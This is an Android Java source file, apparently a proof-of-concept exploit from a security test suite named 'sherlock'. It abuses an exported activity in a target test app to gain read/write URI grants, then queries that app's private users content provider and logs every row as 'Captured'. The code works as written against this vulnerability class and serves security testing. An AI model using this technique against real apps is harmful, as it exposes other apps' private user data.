package sherlock.poc;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

public class AccessToArbitraryBaseActivity extends AppCompatActivity {

    public static Intent newIntent(Context packageContext) {
        return new Intent(packageContext, AccessToArbitraryBaseActivity.class);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setData(Uri.parse("content://sherlock.test.users_provider/users"));
        i.setClassName("sherlock.test", "sherlock.test.access_to_arbitrary.base.BaseUnsafeOneActivity");
        i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        launcher.launch(i);
    }

    ActivityResultLauncher<Intent> launcher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == -1) {
                    Intent data = result.getData();
                    Uri providerUri = data.getData();
                    Cursor c = getContentResolver().query(
                            providerUri,
                            null,
                            null,
                            null,
                            null
                    );
                    try {
                        if (c.getCount() == 0) {
                            return;
                        }
                        c.moveToFirst();
                        StringBuilder sb = new StringBuilder();
                        while (!c.isAfterLast()) {
                            for (int i = 0; i < c.getColumnCount(); i++) {
                                String providerData = c.getColumnName(i) + ":" + c.getString(i) + ";";
                                sb.append(providerData);
                            }
                            c.moveToNext();
                        }
                        Log.d("SUCCESS!!", "Captured: " + sb);
                    } finally {
                        c.close();
                    }
                }
            }
    );
}